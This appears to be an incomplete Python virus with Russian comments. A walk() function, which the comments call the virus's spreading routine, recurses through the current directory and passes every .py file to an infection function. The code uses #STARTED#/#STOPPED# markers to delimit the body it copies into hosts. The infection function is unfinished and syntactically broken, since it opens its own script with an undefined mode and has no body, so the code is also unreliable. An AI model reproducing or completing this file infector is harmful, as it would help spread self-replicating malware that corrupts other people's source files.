#STARTED#
import sys, os  # sys читает ,os распространяет

def virus(python):
    begin = "#STARTED#\n" ; end="#STOPPED#\n"
    with open (sys.argv[0],r)

def walk(dir):
    """ Функция распространения вируса """
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            if os.path.splitext(path)[1] == ".py":
                virus(path)
            else:
                pass
        else:
            walk(path)
walk(os.getcwd())

#STOPPED#
